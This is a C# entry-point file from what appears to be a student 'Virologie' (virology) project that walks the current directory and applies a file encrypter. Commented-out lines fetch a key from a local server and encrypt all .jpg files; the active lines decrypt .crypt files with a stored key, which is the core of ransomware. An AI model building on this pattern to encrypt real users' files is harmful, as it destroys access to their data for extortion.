using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;
using System.Text;
using System.IO;

namespace Virologie
{
    static class Program
    {
        /// <summary>
        /// Point d'entrée principal de l'application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            FileExplorer explorer = new FileExplorer();
            //FileEncrypter encrypter = CryptoKeyManager.CreateFromServer("http://localhost:1234/");
            //explorer.ExploreAndApply(Directory.GetCurrentDirectory(), "*.jpg", encrypter.Encrypt);
            FileEncrypter encrypter = CryptoKeyManager.CreateFromFile("029c3d70-a107-474d-8f70-6ced21c8b68b");
            explorer.ExploreAndApply(Directory.GetCurrentDirectory(), "*.crypt", encrypter.Decrypt);
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
        }
    }
}
